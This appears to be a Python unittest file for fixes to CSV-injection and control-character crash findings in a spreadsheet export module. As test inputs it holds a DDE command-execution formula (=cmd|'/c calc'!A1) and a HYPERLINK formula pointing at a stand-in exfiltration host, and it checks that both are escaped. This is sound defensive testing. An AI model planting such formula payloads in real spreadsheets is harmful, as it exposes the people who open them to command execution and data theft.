"""Tests for parsing-evidence audit P0 fixes (csv-injection + crash).

Findings (adversarially confirmed, high confidence):
  * csv-injection: _write_rows wrote the header row verbatim, so a customer
    header beginning with = + - @ became a live formula in the report xlsx.
  * crash: _safe_cell did not strip XML-illegal control chars (NUL etc.), so
    openpyxl raised IllegalCharacterError at report write, discarding the whole
    match run.
"""

from __future__ import annotations

import unittest

from openpyxl import Workbook

from app.spreadsheet_io import _safe_cell, _write_rows


class ParsingEvidenceP0Tests(unittest.TestCase):
    def test_safe_cell_strips_xml_illegal_control_chars(self) -> None:
        # NUL, 0x01, 0x1f must be removed (openpyxl IllegalCharacterError range)
        self.assertEqual(_safe_cell("foo\x00bar\x01baz\x1f"), "foobarbaz")
        self.assertEqual(_safe_cell("\x00"), "")

    def test_safe_cell_preserves_formula_escape(self) -> None:
        self.assertEqual(_safe_cell("=cmd|'/c calc'!A1"), "'=cmd|'/c calc'!A1")
        self.assertEqual(_safe_cell("+1"), "'+1")
        self.assertEqual(_safe_cell("@bad"), "'@bad")

    def test_write_rows_sanitizes_formula_in_headers(self) -> None:
        # A customer header beginning with '=' must NOT become a formula cell
        # in the written sheet (csv-injection fix).
        workbook = Workbook()
        worksheet = workbook.active
        malicious = "=HYPERLINK(\"http://evil.example/exfil\",\"click\")"
        _write_rows(worksheet, [malicious, "name"], [{malicious: "x", "name": "a"}])
        header_cell = worksheet.cell(row=1, column=1)
        self.assertNotEqual(
            header_cell.data_type,
            "f",
            "header became a formula — csv-injection not sanitized",
        )
        self.assertTrue(str(header_cell.value).startswith("'"))


if __name__ == "__main__":
    unittest.main()
